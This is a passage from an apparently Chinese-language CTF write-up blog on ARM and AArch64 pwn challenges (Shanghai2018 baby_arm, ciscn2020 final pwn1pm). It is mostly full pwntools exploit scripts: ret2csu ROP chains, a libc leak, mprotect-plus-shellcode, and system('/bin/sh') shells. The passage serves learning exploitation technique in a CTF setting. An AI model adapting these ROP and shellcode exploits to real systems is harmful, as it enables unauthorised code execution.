</span></span><span class=line><span class=cl>    <span class=n>libc</span><span class=o>.</span><span class=n>address</span> <span class=o>=</span> <span class=n>puts_addr</span> <span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s2>&#34;puts&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>check</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>PT</span><span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>payload2</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x54</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>g1</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=nb>next</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;/bin/sh&#34;</span><span class=p>)))</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s2>&#34;system&#34;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=n>write_diary</span><span class=p>(</span><span class=n>payload2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>exit</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>argc</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>argc</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=n>localfile</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>argc</span> <span class=o>==</span> <span class=mi>2</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>host</span><span class=p>,</span> <span class=n>port</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>argc</span> <span class=o>==</span> <span class=mi>3</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>host</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>port</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>([</span><span class=s2>&#34;qemu-arm&#34;</span><span class=p>,</span> <span class=s2>&#34;-g&#34;</span><span class=p>,</span> <span class=s2>&#34;1234&#34;</span><span class=p>,</span> <span class=n>localfile</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>localfile</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>locallibc</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>exp</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=shanghai2018-baby_arm>Shanghai2018 baby_arm</h3><p>aarch64的栈帧布局发生了变化，X29(fp), X30(lr)存储在栈帧底部，数据在上方。</p><p>程序首先读入512字节到bss，然后在子函数（栈帧长0x50）中读入512的数据到栈上，存在溢出。程序有一段未执行的函数，调用了mprotect将0x411000开始的0x1000字节（这段地址包含got，bss等）权限设置为0。</p><p>受此启发，将shellcode读到bss，使用mprotect修改这段地址为可执行，然后劫持控制到bss。</p><p>使用<a href=https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium-rop-zh/#ret2csu>ret2csu</a>的方式进行设置参数劫持调用。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># 位于main函数下方的csu函数
</span></span><span class=line><span class=cl>.text:00000000004008AC loc_4008AC                              ; CODE XREF: sub_400868+60↓j
</span></span><span class=line><span class=cl>.text:00000000004008AC                 LDR             X3, [X21,X19,LSL#3]
</span></span><span class=line><span class=cl>.text:00000000004008B0                 MOV             X2, X22
</span></span><span class=line><span class=cl>.text:00000000004008B4                 MOV             X1, X23
</span></span><span class=line><span class=cl>.text:00000000004008B8                 MOV             W0, W24
</span></span><span class=line><span class=cl>.text:00000000004008BC                 ADD             X19, X19, #1
</span></span><span class=line><span class=cl>.text:00000000004008C0                 BLR             X3
</span></span><span class=line><span class=cl>.text:00000000004008C4                 CMP             X19, X20
</span></span><span class=line><span class=cl>.text:00000000004008C8                 B.NE            loc_4008AC
</span></span><span class=line><span class=cl>.text:00000000004008CC
</span></span><span class=line><span class=cl>.text:00000000004008CC loc_4008CC                              ; CODE XREF: sub_400868+3C↑j
</span></span><span class=line><span class=cl>.text:00000000004008CC                 LDP             X19, X20, [SP,#var_s10]
</span></span><span class=line><span class=cl>.text:00000000004008D0                 LDP             X21, X22, [SP,#var_s20]
</span></span><span class=line><span class=cl>.text:00000000004008D4                 LDP             X23, X24, [SP,#var_s30]
</span></span><span class=line><span class=cl>.text:00000000004008D8                 LDP             X29, X30, [SP+var_s0],#0x40
</span></span><span class=line><span class=cl>.text:00000000004008DC                 RET
</span></span></code></pre></td></tr></table></div></div><p>exp</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>localfile</span> <span class=o>=</span> <span class=s2>&#34;./pwn&#34;</span>
</span></span><span class=line><span class=cl><span class=c1># locallibc = &#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>localfile</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s2>&#34;debug&#34;</span>
</span></span><span class=line><span class=cl><span class=n>pf</span>      <span class=o>=</span> <span class=k>lambda</span> <span class=n>name</span><span class=p>,</span><span class=n>num</span>           <span class=p>:</span><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=n>name</span> <span class=o>+</span> <span class=s2>&#34;: 0x</span><span class=si>%x</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>num</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>g</span>       <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>                  <span class=p>:</span><span class=nb>next</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=n>asm</span><span class=p>(</span><span class=n>x</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>.text:00000000004008AC loc_4008AC                              ; CODE XREF: sub_400868+60↓j
</span></span></span><span class=line><span class=cl><span class=s2>.text:00000000004008AC                 LDR             X3, [X21,X19,LSL#3]
</span></span></span><span class=line><span class=cl><span class=s2>.text:00000000004008B0                 MOV             X2, X22
</span></span></span><span class=line><span class=cl><span class=s2>.text:00000000004008B4                 MOV             X1, X23
</span></span></span><span class=line><span class=cl><span class=s2>.text:00000000004008B8                 MOV             W0, W24
</span></span></span><span class=line><span class=cl><span class=s2>.text:00000000004008BC                 ADD             X19, X19, #1
</span></span></span><span class=line><span class=cl><span class=s2>.text:00000000004008C0                 BLR             X3
</span></span></span><span class=line><span class=cl><span class=s2>.text:00000000004008C4                 CMP             X19, X20
</span></span></span><span class=line><span class=cl><span class=s2>.text:00000000004008C8                 B.NE            loc_4008AC
</span></span></span><span class=line><span class=cl><span class=s2>.text:00000000004008CC
</span></span></span><span class=line><span class=cl><span class=s2>.text:00000000004008CC loc_4008CC                              ; CODE XREF: sub_400868+3C↑j
</span></span></span><span class=line><span class=cl><span class=s2>.text:00000000004008CC                 LDP             X19, X20, [SP,#var_s10]
</span></span></span><span class=line><span class=cl><span class=s2>.text:00000000004008D0                 LDP             X21, X22, [SP,#var_s20]
</span></span></span><span class=line><span class=cl><span class=s2>.text:00000000004008D4                 LDP             X23, X24, [SP,#var_s30]
</span></span></span><span class=line><span class=cl><span class=s2>.text:00000000004008D8                 LDP             X29, X30, [SP+var_s0],#0x40
</span></span></span><span class=line><span class=cl><span class=s2>.text:00000000004008DC                 RET
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>X21 = address of function address
</span></span></span><span class=line><span class=cl><span class=s2>X22 = X2
</span></span></span><span class=line><span class=cl><span class=s2>X23 = X1
</span></span></span><span class=line><span class=cl><span class=s2>W24 = W0
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>csu_rop</span><span class=p>(</span><span class=n>call</span><span class=p>,</span> <span class=n>x0</span><span class=p>,</span> <span class=n>x1</span><span class=p>,</span> <span class=n>x2</span><span class=p>,</span> <span class=n>ret</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span>  <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x4008CC</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xdeadbeef</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x4008AC</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>call</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>x2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>x1</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>x0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xdeadbeef</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>ret</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>payload</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>exp</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>sc</span> <span class=o>=</span> <span class=n>asm</span><span class=p>(</span><span class=n>shellcraft</span><span class=o>.</span><span class=n>execve</span><span class=p>(</span><span class=s2>&#34;/bin/sh&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Name:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>sc</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sleep</span><span class=p>(</span><span class=mf>0.1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x48</span> <span class=o>+</span> <span class=n>csu_rop</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s2>&#34;read&#34;</span><span class=p>],</span> <span class=mi>0</span><span class=p>,</span> <span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s2>&#34;__gmon_start__&#34;</span><span class=p>],</span> <span class=mi>8</span><span class=p>,</span> <span class=mh>0x400824</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sleep</span><span class=p>(</span><span class=mf>0.1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>plt</span><span class=p>[</span><span class=s2>&#34;mprotect&#34;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Name:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>sc</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sleep</span><span class=p>(</span><span class=mf>0.1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x48</span> <span class=o>+</span> <span class=n>csu_rop</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s2>&#34;__gmon_start__&#34;</span><span class=p>],</span> <span class=mh>0x411000</span><span class=p>,</span> <span class=mh>0x1000</span><span class=p>,</span> <span class=mi>7</span><span class=p>,</span> <span class=mh>0x411068</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>argc</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>argc</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=n>localfile</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>argc</span> <span class=o>==</span> <span class=mi>2</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>host</span><span class=p>,</span> <span class=n>port</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>argc</span> <span class=o>==</span> <span class=mi>3</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>host</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>port</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>localfile</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># libc = ELF(locallibc)</span>
</span></span><span class=line><span class=cl><span class=n>exp</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=ciscn2020-final-pwn1pm>ciscn2020 final pwn1pm</h3><p>主要使用了以下两个gadget，控制函数第一个参数。调用printf泄露libc地址，然后<code>system("bin/sh")</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>0x00010348 : pop {r3, pc}
</span></span><span class=line><span class=cl>0x000104f8 : mov r0, r3 ; sub sp, fp, #4 ; pop {fp, pc}
</span></span></code></pre></td></tr></table></div></div><p>同一个shell进程本地运行多次可以发现，程序库加载地址和栈地址不会发生变化，但是在另一个shell进程就可能有变化。幸运的是，地址似乎只有两种变化，非此即彼。</p><p>因为<code>sub sp, fp, #4</code>，这里假定了服务器端的栈地址和本地一致，实际不确定。。。</p><p><a href=https://github.com/clxsh/ctf_wps/blob/10c96609740f1c6fadd9ac88a642c1fd0e3eb3d5/others/armpwn/ciscn2020_final_pwn1pm/exp.py>exp</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>os</span><span class=o>=</span><span class=s2>&#34;linux&#34;</span><span class=p>,</span> <span class=n>arch</span><span class=o>=</span><span class=s2>&#34;amd64&#34;</span><span class=p>,</span> <span class=n>log_level</span><span class=o>=</span><span class=s2>&#34;debug&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>localfile</span> <span class=o>=</span> <span class=s2>&#34;./bin&#34;</span>
</span></span><span class=line><span class=cl><span class=n>locallibc</span> <span class=o>=</span> <span class=s2>&#34;./libc.so.6&#34;</span>
</span></span><span class=line><span class=cl><span class=n>pf</span>      <span class=o>=</span> <span class=k>lambda</span> <span class=n>name</span><span class=p>,</span><span class=n>num</span>           <span class=p>:</span><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=n>name</span> <span class=o>+</span> <span class=s2>&#34;: 0x</span><span class=si>%x</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>num</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>g</span>       <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>                  <span class=p>:</span><span class=nb>next</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=n>asm</span><span class=p>(</span><span class=n>x</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>0x00010348 : pop {r3, pc}
</span></span></span><span class=line><span class=cl><span class=s2>0x000104f8 : mov r0, r3 ; sub sp, fp, #4 ; pop {fp, pc}
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>exp</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x100</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0xfffeeffc</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x10348</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s2>&#34;read&#34;</span><span class=p>])</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x104f8</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>plt</span><span class=p>[</span><span class=s2>&#34;printf&#34;</span><span class=p>])</span><span class=o>*</span><span class=mi>2</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s2>&#34;main&#34;</span><span class=p>])</span><span class=o>*</span><span class=mi>8</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;input: &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>read_addr</span> <span class=o>=</span> <span class=n>u32</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>4</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>libc</span><span class=o>.</span><span class=n>address</span> <span class=o>=</span> <span class=n>read_addr</span> <span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s2>&#34;read&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x100</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0xfffef024</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x10348</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=nb>next</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;/bin/sh&#34;</span><span class=p>)))</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x104f8</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s2>&#34;system&#34;</span><span class=p>])</span><span class=o>*</span><span class=mi>2</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;input: &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>argc</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>argc</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=n>localfile</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>argc</span> <span class=o>==</span> <span class=mi>2</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>host</span><span class=p>,</span> <span class=n>port</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>argc</span> <span class=o>==</span> <span class=mi>3</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>host</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>port</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># io  = process([&#34;qemu-arm&#34;, &#34;-g&#34;, &#34;1234&#34;, &#34;./bin&#34;])</span>
